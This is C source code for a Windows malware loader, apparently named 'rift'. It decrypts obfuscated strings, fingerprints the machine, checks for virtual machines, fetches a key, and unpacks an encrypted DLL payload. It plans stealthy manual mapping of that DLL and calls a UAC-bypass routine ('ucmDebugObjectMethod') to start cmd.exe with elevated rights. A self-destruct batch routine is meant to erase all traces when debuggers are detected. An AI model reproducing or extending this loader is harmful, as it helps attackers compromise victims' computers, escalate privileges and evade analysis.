#include "_riftldr.h"

typedef BOOL(*pEDllInit)(_In_ PPIB);
typedef NTSTATUS(*ucmDebugObjectMethod)(_In_ PWSTR pszPayload);

INT WINAPI wWinMain(
	_In_     HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_     PWSTR     pCmdLine,
	_In_     INT       nCmdShow
) {
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(nCmdShow);
	{	// Initialize Process Information Block
		g_PIB->sMod.hMH = hInstance;
		GetCurrentDirectoryW(MAX_PATH, g_PIB->sMod.szCD);
		EXoshiroBegin(NULL);
		IGenerateHardwareId(&g_PIB->sID.HW);
		IGenerateSessionId(&g_PIB->sID.SE);
		g_PIB->sArg.v = CommandLineToArgvW(pCmdLine, &g_PIB->sArg.n); // bugy (sometimes causes an excepion)
	}

	PCSTR testid = EUuidEncodeA(&g_PIB->sID.HW);
	UUID test;
	EUuidDecodeA(testid, &test);

	if (g_PIB->sArg.n > 0) {
		if (!lstrcmpW(g_PIB->sArg.v[0], L"/i")) { // Start Installation

		} else if (!lstrcmpW(g_PIB->sArg.v[0], L"/s")) { // Start

		}
	} else {

	}

	// Create Random Mutex using SeId
	SIZE_T nResult;
	PCWSTR szLocal = DecryptString("/xxatZo5JyvmRnM3Z2HM4g==", &nResult); // L"Local\\"
	PWSTR szMutex = AllocMemory(MAX_PATH * sizeof(WCHAR));
	StringCchCopyW(szMutex, MAX_PATH, szLocal);
	FreeMemory(szLocal);
	PVOID pHWID = AllocMemory(MD5_SIZE);
	CopyMemory(pHWID, &g_PIB->sID.SE, MD5_SIZE);
	PCWSTR szRandom = EAllocRandomBase64StringW(pHWID, MAX_PATH / 2, MAX_PATH - 7);
	FreeMemory(pHWID);
	StringCchCatW(szMutex, MAX_PATH, szRandom);
	FreeMemory(szRandom);

	// CreateMutexW(0, FALSE, szMutex);

	// init con
	IOpenConsole();
	BOOL bVM = ICheckVmPresent();

	PVOID pWKey = IDownloadKey();
	if (!pWKey) {
		PWSTR szKeyBlob = (PWSTR)AllocMemory(MAX_PATH);
		PathCchCombine(szKeyBlob, MAX_PATH, g_PIB->sMod.szCD, L"RIFTWKEY"); // Temporery
		DWORD nKeyBlob;
		pWKey = AllocReadFileW(szKeyBlob, &nKeyBlob);
	} if (pWKey)
		ECryptBegin(pWKey, &g_PIB->sCIB.WK);
	else
		return 0x45e0;

	SIZE_T nDll;
	PVOID pDll = EUnpackResource(&g_PIB->sCIB.WK, IDR_RIFTDLL, &nDll);
	if (!pDll)
		return 0x132d;

#ifndef _DEBUG
	// Implement Manual Mapping using BlackBone
#else
	HMODULE dhDll = LoadLibraryExW(L"_riftdll.dll", NULL, LOAD_LIBRARY_SEARCH_APPLICATION_DIR);
	if (!dhDll)
		return 0x2ab5;

	pEDllInit EDllInit = (pEDllInit)GetProcAddress(dhDll, "EDllInit");
	BOOL bTest = EDllInit(g_PIB);

	ucmDebugObjectMethod Elevate = (ucmDebugObjectMethod)GetProcAddress(dhDll, "ucmDebugObjectMethod");
	WCHAR payload[] = L"C:\\WINDOWS\\system32\\cmd.exe";
	Elevate(payload);

	FreeLibrary(dhDll);
#endif
	SecureZeroMemory(pDll, nDll);
	FreeMemory(pDll);

	{	// CleanUp
		EXoshiroEnd(NULL);
		LocalFree(g_PIB->sArg.v);
		HeapFree(g_PIB->hPH, NULL, g_PIB);
	} return 0;
}

/*	This function basically does what it's called,
	it "cleans" (or better purges) everything it can and tries to destroy
	all traces of it self (the loader and everything else it extracts).
	It should get triggered (/called) if any fatal error occurs,
	or the loader catches any suspicious activities (e.g. debuggers).  */
CONST STATIC WCHAR l_szSelfDelBat[] = {
	L"@echo off\n"
	L"%x:\n"
	L"\tdel \"%s\" /f\n"
	L"\tif exist \"%s\" (\n"
	L"\t\tgoto %x\n"
	L"\t)\n"
	L"del \"%s\" /f"
};
VOID ESelfDestruct() {
	// Prepare String for Filename of Batchfile
	PWSTR szFilePath = (PWSTR)AllocMemory(MAX_PATH * sizeof(WCHAR));
	PCWSTR szRandom = EAllocRandomPathW(NULL, 8, 16);
	CopyMemory(szFilePath, g_PIB->sMod.szCD, MAX_PATH * sizeof(WCHAR));
	PathCchAppend(szFilePath, MAX_PATH * sizeof(WCHAR), szRandom);
	PathCchAddExtension(szFilePath, MAX_PATH * sizeof(WCHAR), L".bat");

	// Prepare Script content
	PVOID pScriptW = AllocMemory(0x800);
	UINT uiRandomID = EXoshiroSS(NULL);
	PCWSTR szMFN = GetFileNameFromPathW(g_PIB->sMod.szMFN);
	StringCchPrintfW(pScriptW, 0x400, l_szSelfDelBat, uiRandomID, szMFN, szMFN, uiRandomID, GetFileNameFromPathW(szFilePath));

	// Convert to Raw (ANSI)
	SIZE_T nScript;
	StringCchLengthW(pScriptW, 0x400, &nScript);
	PSTR pScriptA = AllocMemory(0x400);
	WideCharToMultiByte(CP_ACP, NULL, pScriptW, -1, pScriptA, 0x400, NULL, NULL);
	FreeMemory(pScriptW);

	// Write to Disk
	WriteFileCW(szFilePath, pScriptA, nScript);
	FreeMemory(pScriptA);
}